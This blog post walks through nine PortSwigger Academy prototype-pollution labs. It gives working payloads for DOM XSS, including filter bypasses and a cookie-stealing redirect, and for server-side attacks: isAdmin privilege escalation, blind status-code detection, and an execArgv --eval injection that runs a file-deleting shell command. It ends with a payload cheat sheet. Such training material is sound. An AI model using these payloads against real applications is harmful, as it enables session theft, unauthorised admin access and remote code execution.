---
layout: default
title: "Mastering Prototype Pollution: A Deep Dive into PortSwigger Labs (Part 2)"
date: 2025-12-26
categories: [Web Security, Prototype Pollution]
toc: true
---

# 🧠 Understanding Prototype Pollution Exploitation



Prototype Pollution occurs when an application recursively merges user-controllable input into an object without sanitizing the keys. This allows an attacker to inject properties into the global `Object.prototype`, which are then inherited by all objects in the application.

This guide breaks down **nine** distinct exploitation scenarios found in the PortSwigger Web Security Academy, covering both Client-Side (DOM XSS) and Server-Side (Privilege Escalation & RCE) attacks.

---

## 🧪 LAB 1: Client-Side Prototype Pollution via Browser APIs

### 🧐 How the Vulnerability Exists
The application uses `Object.defineProperty()` to define a configuration property (`transport_url`), making it non-writable and non-configurable. However, the descriptor object passed to `defineProperty` fails to define a `value`.

**Root Cause:** When `value` is missing from the descriptor, the browser looks up the prototype chain. If `Object.prototype` is polluted with a `value`, `defineProperty` inherits and uses it.

### 🚨 Exploitation Steps

1.  **Detect Source:**
    Inject a property via the URL query string: `/?__proto__[foo]=bar`.
    Check `Object.prototype.foo` in the console. If it exists, pollution is confirmed.

2.  **Analyze Gadget:**
    Review `searchLoggerConfigurable.js`. It defines `transport_url` but omits the `value` in the descriptor.

3.  **Exploit:**
    Inject a malicious `value` property that contains the XSS payload.
    **Payload:** `/?__proto__[value]=data:,alert(1);`.

4.  **Result:**
    The application inherits the malicious value for `transport_url` and creates a script tag pointing to it, executing the alert.

**IMPACT:** DOM XSS.

---

## 🧪 LAB 2: DOM XSS via Client-Side Prototype Pollution

### 🧐 How the Vulnerability Exists
The application parses the URL query string and recursively merges it into an object. It later checks a `config` object for a `transport_url` property. Since this property is undefined on `config`, it falls back to the prototype.

**Root Cause:** Insecure recursive merge function allowing `__proto__` as a key.

### 🚨 Exploitation Steps

1.  **Enable DOM Invader:**
    Use Burp's browser. Enable **DOM Invader** and toggle "Prototype pollution" ON.

2.  **Scan:**
    Reload the page. DOM Invader identifies the `search` query string as a vector. Click **Scan for gadgets**.

    ![image](/images/Pasted%20image%2020251211143100.png)

3.  **Exploit:**
    DOM Invader finds that `transport_url` flows into a `script.src` sink. Click **Exploit**.
    **Manual Payload:** `/?__proto__[transport_url]=data:,alert(1);`.

    ![image](/images/Pasted%20image%2020251211143515.png)

**IMPACT:** DOM XSS.

---

## 🧪 LAB 3: DOM XSS via an Alternative Prototype Pollution Vector

### 🧐 How the Vulnerability Exists
The application attempts to sanitize input by stripping the `__proto__` key when used in bracket notation (e.g., `a[__proto__]`). However, it fails to block **dot notation**.

**Root Cause:** Inconsistent sanitization allows `a.__proto__` to pass through.

### 🚨 Exploitation Steps

1.  **Test Bypass:**
    Try `/?__proto__[foo]=bar` -> Fails (Filtered).
    Try `/?__proto__.foo=bar` -> Success (Polluted).

2.  **Identify Gadget:**
    The code calls `eval(manager.sequence)`. The `sequence` property is undefined on `manager`.

3.  **Craft Exploit:**
    Inject `sequence` via the alternative vector.
    **Payload:** `/?__proto__.sequence=alert(1)-`
    *Note:* The trailing `-` fixes the syntax error because the app appends data to the payload.

    ![image](/images/Pasted%20image%2020251211150520.png)

**IMPACT:** Arbitrary JavaScript Execution (DOM XSS).

---

## 🧪 LAB 4: Client-Side Prototype Pollution via Flawed Sanitization

### 🧐 How the Vulnerability Exists
The application uses a sanitization function that removes the string `__proto__` but does not do so recursively.

**Root Cause:** **Non-Recursive Stripping**. If we nest the key (`__pro__proto__to__`), the sanitizer removes the middle `__proto__`, and the remaining characters collapse to form the dangerous key again.

### 🚨 Exploitation Steps

1.  **Bypass Filter:**
    Inject: `/?__pro__proto__to__[foo]=bar`.
    Check console: `Object.prototype.foo` exists.

2.  **Exploit Gadget:**
    The app uses `transport_url` to load scripts.
    **Payload:** `/?__pro__proto__to__[transport_url]=data:,alert(1);`.

    ![image](/images/Pasted%20image%2020251211152138.png)

**IMPACT:** DOM XSS via Filter Bypass.

---

## 🧪 LAB 5: Client-Side Prototype Pollution in Third-Party Libraries

### 🧐 How the Vulnerability Exists
The application uses an older version of a third-party library (like Google Analytics or a slider) that contains a known prototype pollution vulnerability. The vector is the URL fragment (`location.hash`).

**Root Cause:** Vulnerable library code parsing configuration from the URL hash.

### 🚨 Exploitation Steps

1.  **Scan with DOM Invader:**
    Enable DOM Invader. Reload. It detects a vulnerability in the `hash`.

    ![image](/images/Pasted%20image%2020251211152707.png)

2.  **Identify Gadget:**
    The scan reveals the `hitCallback` gadget which flows into `setTimeout`.

3.  **Deliver Exploit:**
    Use the Exploit Server to redirect the victim:
    ```
    <script>
    location="[https://YOUR-LAB-ID.web-security-academy.net/#__proto](https://YOUR-LAB-ID.web-security-academy.net/#__proto)__[hitCallback]=alert(document.cookie)"
    </script>
    ```
   
**IMPACT:** DOM XSS via Third-Party Library.

---

## 🧪 LAB 6: Privilege Escalation via Server-Side Prototype Pollution

### 🧐 How the Vulnerability Exists
The Node.js backend merges JSON input from the "Update Address" feature into a user object. It does not filter `__proto__`.

**Root Cause:** Server-side recursive merge allowing modification of the global object prototype.

### 🚨 Exploitation Steps

1.  **Analyze Request:**
    Intercept the `POST /my-account/change-address` request. Note the JSON structure.

2.  **Pollute:**
    Add a `__proto__` object with an `isAdmin` property.
    ```
    "__proto__": {
        "isAdmin": true
    }
    ```

3.  **Verify:**
    The server response reflects `"isAdmin": true`. Refresh the page to see the "Admin Panel" link.

    ![image](/images/Pasted%20image%2020251211155843.png)

**IMPACT:** Vertical Privilege Escalation.

---

## 🧪 LAB 7: Detecting SSPP Without Polluted Property Reflection (Blind)

### 🧐 How the Vulnerability Exists
The application is vulnerable to Server-Side Prototype Pollution (SSPP) but does not reflect the polluted properties in the response (Blind).

**Root Cause:** We must use **Status Code Override** to detect the pollution. Node's default error handling looks for a `status` property on error objects.

### 🚨 Exploitation Steps

1.  **Establish Baseline:**
    Send invalid JSON. Note the default error status (e.g., 400 or 500).

2.  **Pollute Status:**
    Inject a payload to set the global status code.
    ```
    "__proto__": {
        "status": 555
    }
    ```

3.  **Trigger Error:**
    Send invalid JSON again.
    **Observation:** The response status is now **555**, confirming pollution.

    ![image](/images/Pasted%20image%2020251211160914.png)

**IMPACT:** Confirmed Blind Prototype Pollution.

---

## 🧪 LAB 8: Bypassing Flawed Input Filters for Server-Side Prototype Pollution

### 🧐 How the Vulnerability Exists
The server sanitizes the `__proto__` key but fails to block the `constructor` property.

**Root Cause:** **Constructor Injection**. `myObj.constructor.prototype` resolves to the same object as `myObj.__proto__`.

### 🚨 Exploitation Steps

1.  **Test Filter:**
    Inject `__proto__` with `"json spaces": 10`.
    Check Raw response. Indentation unchanged (Blocked).

2.  **Bypass:**
    Use the constructor vector.
    ```
    "constructor": {
        "prototype": {
            "isAdmin": true
        }
    }
    ```

3.  **Verify:**
    The response reflects `isAdmin: true`. Access the admin panel to solve.

    ![image](/images/Pasted%20image%2020251211173145.png)

**IMPACT:** Privilege Escalation via Filter Bypass.

---

## 🧪 LAB 9: Remote Code Execution via Server-Side Prototype Pollution

### 🧐 How the Vulnerability Exists
The application uses `child_process.fork()` or `exec()` to run background maintenance jobs. It is vulnerable to pollution.

**Root Cause:** Node's child process functions accept an options object. If `execArgv` is undefined, it reads from the prototype. We can inject the `--eval` flag to run arbitrary code.

### 🚨 Exploitation Steps

1.  **Detect Pollution:**
    Use `"constructor": {"prototype": {"json spaces": 10}}` to confirm vulnerability via response indentation.

2.  **Inject RCE Payload:**
    Pollute `execArgv` to execute a command when a child process spawns.
    ```
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
        ]
    }
    ```

3.  **Trigger:**
    Click the "Run maintenance jobs" button in the admin panel. The child process spawns, inherits the malicious arguments, and executes the command.

    ![image](/images/Pasted%20image%2020251211175846.png)

**IMPACT:** Remote Code Execution (RCE).

---

## ⚡ Fast Triage Cheat Sheet

| Attack Vector | 🚩 Immediate Signal | 🔧 The Critical Move |
| :--- | :--- | :--- |
| **Client Standard** | `?__proto__[test]=1` | Check `Object.prototype.test` in console. |
| **Client Alternative** | Standard blocked. | Try `?__proto__.test=1` (Dot notation). |
| **Client Sanitization** | `__proto__` stripped. | Try `?__pro__proto__to__[test]=1`. |
| **Server Reflected** | Input mirrored in JSON. | Inject `{"__proto__": {"isAdmin": true}}`. |
| **Server Blind** | No reflection. | Inject `{"__proto__": {"status": 555}}` & trigger error. |
| **Server Bypass** | `__proto__` blocked. | Use `{"constructor": {"prototype": ...}}`. |
| **Server RCE** | Child processes used. | Pollute `execArgv` or `shell`/`input`. |
